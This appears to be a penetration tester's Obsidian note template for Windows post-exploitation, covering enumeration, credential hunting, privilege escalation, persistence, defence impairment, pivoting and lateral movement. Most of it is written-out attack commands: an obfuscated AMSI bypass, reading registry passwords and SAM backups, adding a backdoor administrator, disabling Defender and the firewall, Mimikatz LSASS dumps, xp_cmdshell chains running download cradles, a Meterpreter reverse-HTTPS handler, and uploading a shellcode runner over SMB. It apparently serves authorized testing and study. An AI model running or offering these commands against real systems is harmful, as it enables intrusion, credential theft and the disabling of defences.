---
Topics:
  - "[[01 - Pentesting]]"
  - "[[01 - Red Team]]"
Types:
  - "[[02 - Write Ups]]"
tags:
  - writeup
date created: 
date modified:
---
## Objective

___
```ad-info
title:Objective 

- This note is used to keep track of the target Linux machine's discovery, privilege escalation, persistence and credential access processes
- This note also contains different cheatsheets and resources to aid in those methodologies
- Feel free to remove any sections that are non-applicable to keep this note compact.
```

> You can execute discovery scripts like PowerUp or SeatBelt to retrieve this information or do it manually.
> Try using simpler scripts to retrieve this info before running overwhelming scripts like `WinPeas.exe`.

```ad-seealso
title: Resources
collapse:yes
*Scripts*:
___
[[Payloads Canvas.canvas|Get-HostInfo.ps1 - Payloads Canvas]]
[PowerSploit · PowerUp](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1)
[Compiled Binaries for Ghostpack (.NET v4.0)](https://github.com/r3motecontrol/Ghostpack-CompiledBinaries)
[PEAS (with colors)](https://github.com/peass-ng/PEASS-ng/tree/master)
___
*Cheatsheets for manual enumeration*:
___
[[OSCP Windows Privilege Escalation]]
[[Windows Privilege Escalation Command Cheatsheet]]
___
```
___

## Internal Discovery Notes

> Run the commands yourself or let the script do it for you. Either way paste relevant screenshots here for future reference.

```ad-note
title: Situational Awareness Notes

*Current User Information*
~~~powershell
whoami /all
~~~
*Screenshot*
___

___
*Local Users*
~~~powershell
net user
~~~
*Screenshot*
___

___
*Local Groups*
~~~powershell
net localgroup
~~~
*Screenshot*
___

___
*Current System*
~~~powershell
systeminfo
~~~
*Screenshot*
___

___
*Network Configuration*
~~~powershell
Get-NetIPConfiguration
~~~
*Screenshot*
___

___
*Check Installed Software*
~~~powershell
get-childitem 'C:\Program Files\' | Select-Object Name | Format-Table
~~~
*Screenshot*
___

___
*Check Installed Software x86*
~~~powershell
get-childitem 'C:\Program Files\' | Select-Object Name | Format-Table
~~~
*Screenshot*
___

___
*Root of C:/ Drive Contents*
~~~powershell
get-childitem 'C:\' | Select-Object Name | Format-Table
~~~
> Check non-default folders such as "Setup" or "Inetpub" for credentials.
*Screenshot*
___

___
```

> At this point if you have not found anything of interest, try running *automated tools*.

*PowerUp.ps1* > *SeatBelt.exe* > *WinPeas.exe*

```ad-note
title: Automated Tools

Amsi Bypass for PowerUp.ps1:

~~~powershell
$a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like "*iUtils") {$c=$b}};$d=$c.GetFields('NonPublic,Static');Foreach($e in $d) {if ($e.Name -like "*Context") {$f=$e}};$g=$f.GetValue($null);[IntPtr]$ptr=$g;[Int32[]]$buf = @(0);[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 1)
~~~

- Now you can use a download cradle to import PowerUp and `invoke-allchecks`.
- For SeatBelt.exe you can use any .NetLoader that bypasses AV. [NetRunners Project](https://github.com/Hacker-Hermanos/NetRunners/tree/main)

Paste screenshots for interesting findings here:

___

___
```

Remember to run `ps` from your C2 to find valuable information like processes with interesting tokens for impersonation once you escalate privileges.

```ad-check
title:Process Information
~~~powershell
ps
~~~

```

## Credential Access

> Now that you have a high level understanding of the environment, move onto manual credential harvesting.

```ad-note
title: Credential Access

Source: [Password Hunting – Windows Privilege Escalation](https://juggernaut-sec.com/password-hunting/)

*Powershell History File*

~~~powershell
type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
~~~

> OR

~~~powershell
cat (Get-PSReadlineOption).HistorySavePath
~~~

*Screenshot*
___

___
*IIS Config and Web Files*

> This also applies to non-standard folders such as "Setup" in C:\ or in "Program Files" etc.

~~~powershell
dir C:\inetpub\wwwroot
~~~

> Looking for all sorts of interesting files matching strings.

~~~powershell
Get-Childitem -Recurse C:\inetpub | findstr -i "directory config txt aspx ps1 bat xml pass user"
~~~

> Apache version

~~~powershell
Get-Childitem -Recurse C:\apache | findstr -i "directory config txt php ps1 bat xml pass user"
~~~

> Xampp version

~~~powershell
Get-Childitem -Recurse C:\xampp | findstr -i "directory config txt php ps1 bat xml pass user"
~~~

*Screenshots*
___

___

*Passwords in Registry Keys*

~~~powershell
reg query HKLM /f password /t REG_SZ /s; reg query HKLU /f password /t REG_SZ /s
~~~

~~~powershell
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"
~~~

~~~powershell
reg query "HKLM\SYSTEM\Current\ControlSet\Services\SNMP"; reg query "HKCU\Software\SimonTatham\PuTTY\Sessions"; reg query "HKCU\Software\ORL\WinVNC3\Password"; reg query HKEY_LOCAL_MACHINE\SOFTWARE\RealVNC\WinVNC4 /v password
~~~

*Screenshot*
___

___

*SAM and SYSTEM Backup Files*

~~~powershell
cd C:\ & dir /S /B SAM == SYSTEM == SAM.OLD == SYSTEM.OLD == SAM.BAK == SYSTEM.BAK
~~~

> Then run icacls on these files to see if you can copy them. If you can, transfer them to Kali and dump creds.

~~~powershell
impacket-secretsdump -sam SAM.OLD -system SYSTEM.OLD LOCAL
~~~

*Screenshot*
___

___

*Unattended Files*

~~~powershell
dir C:\unattend.xml; dir C:\Windows\Panther\Unattend.xml; dir C:\Windows\Panther\Unattend\Unattend.xml; dir C:\Windows\system32\sysprep.xml; dir C:\Windows\system32\sysprep\sysprep.xml
~~~

*Screenshot*
___

___

*Alternate Data Streams*

> Looking for data hidden in a suspicious file.

~~~powershell
dir /R
~~~

*Example*:
![[Pasted image 20240428140516.png]]

~~~powershell
more < NothingToSeeHere.txt:secret.txt:$DATA
~~~

*Screenshots*
___

___

*Hidden Files*

> By default `ls` from within Meterpreter will show all files.

~~~powershell
dir /a C:\
~~~

*Screenshot*
___

___

*Interesting File Names*

> Try these inside of web directories, /program files/ directories and user home directories.

~~~powershell
dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config* == *user*
~~~

~~~powershell
findstr /SI "passw pwd" *.xml *.ini *.txt *.ps1 *.bat *.config
~~~

*Screenshot*
___

___

*Stored Credentials (Credential Manager)*

~~~powershell
cmdkey /list
~~~

*Example*:
![[Pasted image 20240428140923.png]]

> Testing credentials. If this works, maybe use IEX pointing to a shellcode runner or download and execute a shellcode runner.

~~~powershell
runas /env /noprofile /savecred /user:DOMAIN/HOST\administrator "cmd.exe /c whoami > C:\temp\whoami.txt"
~~~

*Screenshot*
___

___
```


## Privilege Escalation

```ad-seealso
title: Internal Privilege Escalation Notes
collapse:yes

~~~dataview
list from #windows 
and #privilegeescalation 
~~~
- [[03 - Content/Cert/CRTE/AD Privilege Escalation - Local Privilege Escalation|Local Privilege Escalation Cheatsheet]]
- Vulnerable Applications
- Vulnerable Kernel
```

```ad-seealso
title:AlwaysInstallElevated Privilege Escalation (Meterpreter)
collapse:yes

First *start a meterpreter listener* and run as job "run -j"

> Remember to use the correct session number before the following command

~~~bash
use exploit/windows/local/always_install_elevated
~~~

~~~bash
set VERBOSE true
~~~

~~~bash
set payload windows/exec
~~~

~~~bash
set session 1
~~~

> Set command variable to execute your shellcode runner's location

~~~bash
set cmd 'C:\Windows\Tasks\NR.exe -epi'
~~~

~~~bash
run
~~~

> Set command variable to IEX your shellcode runner

~~~bash
set cmd 'powershell IEX(...)'; run
~~~

> You will receive a new meterpreter session, interact with it.
```

> At this point if you have found a viable vector, exploit it and document it in the block below. 

```ad-summary
title:Local Privilege Escalation Summary

Privilege escalation was performed on HOSTNAME via XXX.
___
**COMMANDS, NOTES, SCREENSHOTS HERE**
___
```

> If you haven't move on, you probably have powerful privileges on the domain or already found viable credentials.

## Persistence 

> You can create a backdoor user, or add an already compromised user to localgroup administrators, or more intricate attacks.
> Keep track of this backdoor on your tracker note.

```ad-seealso
title: Persistence Notes
collapse:yes

[Window’s Persistence – Manual Techniques - Juggernaut-Sec](https://juggernaut-sec.com/windows-persistence-manual-techniques/)
~~~dataview
list from #windows 
or #activedirectory 
and #persistence 
~~~
```

~~~ad-note
title:Persistence Commands

*Backdoor User Windows Persistence*

```powershell
net user backdoor Password123! /add; net localgroup administrators backdoor /add
```
~~~

## Defense Impairment

> If possible turn AV and Firewall off.

~~~ad-note
title:Defense Impairment Commands
*Firewall OFF*

```powershell
netsh Advfirewall set allprofiles state off
```

*Defender OFF*

```powershell
Set-MpPreference -DisableRealtimeMonitoring $true; Set-MpPreference -DisableIOAVProtection $true
```

*Or using `sc.exe`*:

```powershell
sc.exe config WinDefend start= disabled
```

```powershell
sc.exe stop WinDefend
```
~~~

## Port Redirection

> Sometimes you need to access a remote machine's port or make your machine accessible to transfer tools. Here you have a cheatsheet for port redirection techniques.

```ad-seealso
title: Pivoting Notes
collapse:yes

[Port Forwarding – Windows Privilege Escalation](https://juggernaut-sec.com/port-forwarding/)
[Metasploit Unleashed | Portfwd](https://www.offsec.com/metasploit-unleashed/portfwd/)
[Pivoting in Metasploit | Metasploit Documentation Penetration Testing Software, Pen Testing Security](https://docs.metasploit.com/docs/using-metasploit/intermediate/pivoting-in-metasploit.html)
[[Chisel HTTP Tunneling Cheatsheet]]
[[Command and Control - Port Forwarding (Socat)]]

**To-do**: Classify all pivoting notes and make a dataview list
```

```ad-example
title:Port Forwarding with NetSh (Windows)
collapse:yes

- Establish an IPV4 to IPV4 port forward

~~~powershell
netsh interface portproxy add v4tov4 listenport=LOCAL_PORT listenaddress=LOCAL_IP connectport=REMOTE_PORT connectaddress=REMOTE_IP
~~~

- The following commands validate current portproxy rules

List IPv4 rules

~~~powershell
netsh interface portproxy show v4tov4 
~~~

List all rules

~~~powershell
netsh interface portproxy show all 
~~~

- Remove established rules

~~~powershell
netsh interface portproxy delete v4tov4 listenport=9090 listenaddress=localhost
~~~
```

```ad-note
title: Meterpreter AutoRoute + Listener
collapse:yes

These commands are useful when you are about to compromise a machine and know the subnet where the other target machines are connected. 

You want to run a shellcode runner to connect to your meterpreter listener. Once the connection is established this command will make an autoroute SOCKS5 session, and you will be able to connect to the other machines via proxychains.

> Remember to change the subnet IP address when using these.

*x64*

~~~bash
msfconsole -q -x "use auxiliary/server/socks_proxy; set SRVPORT 1080; set SRVHOST 127.0.0.1; run -j; use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_https; set LHOST tun0; set LPORT 443; set AutoRunScript 'autoroute -s 172.16.231.0/24'; set EnableStageEncoding true; set StageEncoder x64/xor_dynamic; run"
~~~

*x86*

~~~bash
msfconsole -q -x "use auxiliary/server/socks_proxy; set SRVPORT 1080; set SRVHOST 127.0.0.1; run -j; use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_https; set LHOST tun0; set LPORT 443; set AutoRunScript 'autoroute -s 172.16.231.0/24'; set EnableStageEncoding true; set StageEncoder x64/xor_dynamic; run"
~~~
```

## Credential Access (OS Credential Dumping)

> If you have obtained privileged access to the host, take a moment to dump credentials from LSASS using mimikatz.

~~~ad-note
title: Mimikatz LSASS Dump

*Mimikatz One-Liner*

```powershell
mimikatz.exe "privilege::debug" "log HOSTNAME.txt" "sekurlsa::logonpasswords" "sekurlsa::ekeys" "token::elevate" "lsadump::sam" "lsadump::secrets"
```

*Mimikatz One-Liner + PPL* (mimikatz trunk needed)

```powershell
mimikatz.exe "!+" "!processprotect /process:lsass.exe /remove" "privilege::debug" "log HOSTNAME.txt" "sekurlsa::logonpasswords" "sekurlsa::ekeys" "token::elevate" "lsadump::sam" "lsadump::secrets"
```
~~~

## Lateral Movement 

```ad-seealso
title:Lateral Movement Techniques
collapse:true 

~~~dataview
list from #lateralmovement 
sort file.name asc
~~~
```

```ad-example
title: Convert Kerberos Tickets
collpase:yes

Converting a ccache file found in tmp: 

~~~bash
impacket-ticketConverter krb5cc_ ticket.kirbi
~~~

Converting kirbi to ccache

~~~bash
impacket-ticketConverter ticket.kirbi krb5cc_
~~~

Injecting ticket with Rubeus: 

~~~powershell
Rubeus.exe ptt /ticket:ticket.kirbi
~~~
```

```ad-example
title: MSSQL Lateral Movement
collpase:yes

[MSSQL AD Abuse | HackTricks](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/abusing-ad-mssql)
[Pentesting MSSQL | HackTricks](https://book.hacktricks.xyz/network-services-pentesting/pentesting-mssql-microsoft-sql-server)
[MSSQL Injection | PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MSSQL%20Injection.md)
[SQL injection cheat sheet | PortSwigger](https://portswigger.net/web-security/sql-injection/cheat-sheet)


Enable xp_cmdshell on current machine (one-liner)

~~~sql
EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; EXEC xp_cmdshell 'powershell DOWNLOADCRADLE'
~~~

Enable xp_cmdshell on current machine impersonating 'sa'

~~~sql
EXECUTE AS LOGIN = 'sa'; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; EXEC xp_cmdshell 'powershell DOWNLOADCRADLE'
~~~

Enable xp_cmdshell on remote machine impersonating 'sa'

~~~sql
EXECUTE AS LOGIN = 'sa';
EXEC ('sp_configure ''show advanced options'', 1; reconfigure') AT TARGET
EXEC ('sp_configure ''xp_cmdshell'', 1; reconfigure') AT TARGET
EXEC ('xp_cmdshell ''powershell DOWNLOADCRADLE'' ') AT TARGET
~~~

Enable xp_cmdshell by executing query on remote machine, targeting your machine; impersonating 'sa'. Double jump

~~~sql
EXECUTE AS LOGIN = 'sa';
EXEC ('EXEC (''sp_configure ''''show advanced options'''', 1; reconfigure;'') AT TARGET') AT TARGET_2
EXEC ('EXEC (''sp_configure ''''xp_cmdshell'''', 1; reconfigure;'') AT TARGET') AT TARGET_2
EXEC ('EXEC (''xp_cmdshell ''''<your cmd here>'''''') AT TARGET') AT TARGET_2
EXEC ('EXEC (''xp_cmdshell ''''powershell -enc XXXXX'''''') AT TARGET') AT TARGET_2
~~~

Enable xp_cmdshell by executing query on remote machine, targeting your machine; impersonating 'sa'. Triple jump.

~~~sql
EXEC ('EXEC (''EXEC ('''' sp_configure ''''''''show advanced options'''''''', 1; reconfigure; '''') AT TARGET '') AT TARGET_2') AT TARGET
EXEC ('EXEC (''EXEC ('''' sp_configure ''''''''xp_cmdshell'''''''', 1; reconfigure; '''') AT TARGET '') AT TARGET_2') AT TARGET
EXEC ('EXEC (''EXEC ('''' xp_cmdshell ''''''''powershell DOWNLOADCRADLE'''''''' '''') AT TARGET '') AT TARGET_2') AT TARGET
~~~
```

~~~ad-example
title:PSExec + SMBClient Lateral Movement 
collapse:yes

*New PSExec Session + SMBClient Session*

```bash
proxychains impacket-psexec USER@TARGET -hashes :NTLM
```

```bash
proxychains impacket-smbclient USER@TARGET -hashes :NTLM
```

*Put Malware Using SMBClient*

```bash
use c$
cd /windows/tasks
put NR.exe
```

> Run the shellcode runner using the psexec session (EntryPoint Stomping Process Injection)

```bash
use c$
C:\windows\tasks\NR.exe -epi
```
~~~

> Enumerate access to the other machines in your target list using your new credentials.

```bash
crackmapexec PROTOCOL -k ips.lst -u "USER" -p "PASSWORD"
```

> Also check in which machines your target user has a session on and then move there using his credentials. (use Bloodhound or PowerView for this check).

~~~ad-important
title:Lateral Movement Vectors

Enumerate findings here.
___

___
~~~

*Create a link here to the next machine's note, when you click the link, a new note will be created for that machine.*

